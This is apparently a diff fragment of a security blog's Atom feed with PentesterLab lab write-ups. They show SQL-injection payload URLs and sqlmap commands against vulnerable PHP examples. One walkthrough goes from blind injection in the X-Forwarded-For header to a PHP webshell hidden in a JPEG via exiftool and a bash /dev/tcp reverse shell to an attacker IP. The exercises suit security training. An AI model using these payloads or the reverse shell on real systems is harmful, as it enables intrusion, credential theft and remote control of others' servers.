+</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'><span class="o">...</span> <span class="o">...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>This time the beginning and the end of the string are correctly checked but due to the regular expression contains the <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE_MULTILINE modifier (m)</a>, it makes the regex filter can be bypassed only match one line, does not matter the start or the end. So the SQL injection still happened in following ways.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example7.php?id=2%0a or 1=1</code></p>
+
+<p><code>http://10.10.10.129/sqli/example7.php?id=2 or 123=%0a123</code></p>
+
+<p><code>http://10.10.10.129/sqli/example7.php?id=2 or %0a123=%0a123</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example7.php?id=2%0a*" --dbs</code></p>
+
+<h2>Example 8</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example8.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
+</span><span class='line'><span class="s2">    </span><span class="si">$sql</span><span class="s2"> .= mysql_real_escape_string(</span><span class="si">$_GET[&quot;order&quot;]</span><span class="s2">).&quot;</span><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>From the source code above, we need to inject payload into &ldquo;<em>order by</em>&rdquo; statement. Due to the function &ldquo;<em>extractvalue</em>&rdquo; does not work here, the error information will not display, I have to choose <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">Time-based blind injection</a>.</p>
+
+<p>PoC:</p>
+
+<p>// the page will delay 5 seconds, it means the first character of database() is &lsquo;e&rsquo;
+<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 101)%23`</p>
+
+<p>// the page will display immediately, it means the first character of database() is not &lsquo;f&rsquo;
+<code>http://10.10.10.129/sqli/example8.php?order=id</code>,(select sleep(5) from dual where ASCII(substring(database(),1,1)) = 102)%23`</p>
+
+<p>Here I use mysql default null table <a href="http://en.wikipedia.org/wiki/DUAL_table">DUAL</a> to construct the payload.</p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example8.php?order=id%60*" --dbs --batch</code></p>
+
+<h2>Example 9</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example9.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">ORDER</span> <span class="nx">BY</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">order</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
+</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Thanks to there is no back-tick (`), we have more options to exploit &ldquo;ORDER BY&rdquo; injection. rather than time-based blind injection, we can use <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html#function_if">IF function</a> to construct error-based injection here.</p>
+
+<p>PoC:</p>
+
+<p>// the page will order by name, it means the first character of database() is &lsquo;e&rsquo;
+<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=101),name,age)</code></p>
+
+<p>// the page will order by age, it means the first character of database() is not &lsquo;f&rsquo;
+<code>http://10.10.10.129/sqli/example9.php?order=if((ASCII(substring(database(),1,1))=102),name,age)</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example9.php?order=id" --dbs --batch</code></p>
+
+<p>To be continued&hellip;</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[[PentesterLab] From SQL to Shell II]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii/"/>
+    <updated>2015-05-12T06:33:13-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/05/12/pentesterlab-from-sql-to-shell-ii</id>
+    <content type="html"><![CDATA[<p>This is an upgraded version from previous course &ldquo;<a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell'>From SQL Injection to Shell</a>&rdquo; which is talking about how to exploit basic error-based SQL injection vulnerability, in this course &ldquo;From SQL Injection to Shell II&rdquo;, more advanced techniques will be used to exploit complicated Blind-SQL injection vulnerability.</p>
+
+<p>More information and ISO download please check <a href='https://ptl.io/from_sqli_to_shell_II_i386.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>
+
+<p>Difficulty: 3 / 5</p>
+
+<!-- more -->
+
+
+
+
+<h2>Links</h2>
+
+
+<p>watch video online:
+<iframe src='http://player.vimeo.com/video/127586134?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>
+
+<h2>Method</h2>
+
+
+<ul style="list-style-type:disc">
+<li>Scanned the network to discover the target server [Net Discover]</li>
+<li>Port scanned the target to discover the running services and open ports [nmap]</li>
+<li>Interacted with the web server, found the it is Nginx server and also found admin login page. [Firefox]</li>
+<li>Use sqlmap to test and exploit the blind-SQL injection vulnerability which is happened in HTTP header "X-Forwarded-for". [sqlmap]</li>
+<li>In order to bypass the file validation to upload php webshell, the attacker use exiftool to store php code hidden in a real jpg image. [exiftool]</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul style="list-style-type:disc">
+<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
+<li><a href='https://nmap.org/'>Nmap</a></li>
+<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
+<li><a href='http://sqlmap.org/'>sqlmap</a></li>
+<li><a href='http://www.sno.phy.queensu.ca/~phil/exiftool/'>exiftool</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+
+<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/from_sqli_to_shell_II/course'>pdf</a>, we know that we need to find and exploit a blind SQL injection vulnerability to dump and crack the web admin&rsquo;s password. After login to the dashboard, we need to find a way to bypass file validation function and upload image with php webshell.</p>
+
+<h3>Detect and Exploit Blind SQL injection in HTTP header 'X-Forwarded-for'</h3>
+
+
+<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. When the web page has been loaded, my firefox addon &ldquo;<a href='https://wappalyzer.com/'>wappalyzer</a>&rdquo; show the web server is <a href='http://nginx.org/en/'>Nginx</a> (which has mis-configuration vulnerability will be used later to interpret image file as PHP). Also there is &ldquo;Admin&rdquo; link will access to admin dashboard login page.</p>
+
+<p>Next the attacker uses SQLMAP to detect and exploit the blind SQL injection.</p>
+
+<p>1st detect and fetch all the databases from the server.
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;dbs</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/1.png"></p>
+
+<p>2nd fetch all the tables belong to database &ldquo;photoblog&rdquo;
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;tables -D photoblog &ndash;smart &ndash;batch</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/2.png"></p>
+
+<p>3rd dump table &ldquo;user&rdquo;
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u &ldquo;&lt;a href="http://10.10.10.129/">http://10.10.10.129/&lt;/a>&rdquo; &ndash;headers=&ldquo;X-forwarded-for:1*&rdquo; &ndash;dump -T users -D photoblog &ndash;smart &ndash;batch</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/3.png"></p>
+
+<p>Here we can see that login username is &ldquo;<font color='red'>admin</font>&rdquo; and password is &ldquo;<font color='red'>P4ssw0rd</font>&rdquo;</p>
+
+<p>After login to the dashboard, there is file upload function (the URL is <a href="http://10.10.10.129/admin/new.php">http://10.10.10.129/admin/new.php</a>)</p>
+
+<p>After many times Trail and error, I found the only real image (.png, .jpg and .gif) with correct content can be uploaded, then the image file will be renamed and saved in &ldquo;/admin/uploads/&rdquo;.</p>
+
+<p>However, Nginx has a mis-configure vulnerability which can be exploited to make the shell executed.</p>
+
+<p>In order to test if the target server has the mis-configure vulnerability, I tried the following commands:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e &ldquo;HEAD /admin/uploads/1431253877.jpg HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n&rdquo; | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>
+and
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e &ldquo;HEAD /admin/uploads/1431253877.jpg/test.php HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n&rdquo; | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/4.png"></p>
+
+<p>From the result above, we can see that the difference in the value of &ldquo;Content-Type&rdquo; between the two responses. the second response shows that the file has been interpreted as PHP code.</p>
+
+<p>Now I inject the classic single-line php shell (&lt;?php system($_GET[&lsquo;cmd&rsquo;]); ?>) into an image by using &ldquo;exiftool&rdquo;</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool &ldquo;-comment&lt;=shell.php&rdquo; img.jpg</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Then I set up NC on my Kali Linux to listen on port 5555, after uploaded the file and exploit the Nginx mis-configure vulnerability, I got a shell back.</p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/5.png"></p>
+
+<p>Then I use the following command to get a better shell:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/bash -i >&amp; /dev/tcp/10.10.10.131/4444 0>&amp;1</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img class="left" src="/downloads/fromsqltoshell2/6.png"></p>
+
+<p>Done.</p>
+
+<h3>Code Review</h3>
+
+
+<p>The vulnerable code is in the file stats.php
+<figure class='code'><figcaption><span>stats.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REMOTE_ADDR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">HTTP_X_FORWARDED_FOR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nv">$ip</span><span class="o">=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">HTTP_X_FORWARDED_FOR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$results</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">stats</span> <span class="nx">where</span> <span class="nx">ip</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">);</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ip</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span>
+</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">UPDATE</span> <span class="nx">stats</span> <span class="nx">set</span> <span class="nb">count</span><span class="o">=</span><span class="nb">count</span><span class="o">+</span><span class="mi">1</span> <span class="nx">where</span> <span class="nx">ip</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+</span><span class='line'>      <span class="k">else</span>
+</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nx">stats</span> <span class="p">(</span><span class="nx">ip</span><span class="p">,</span> <span class="nb">count</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span><span class="mi">1</span><span class="p">);</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>As we can see above, there is no input validation or filter against the value of &ldquo;<font color='red'>HTTP_X_FORWARDED_FOR</font>&rdquo; which is saved in variable &ldquo;ip&rdquo; and used in SQL statement directly to make the vulnerability happened.</p>
+]]></content>
+  </entry>
+  
+</feed>
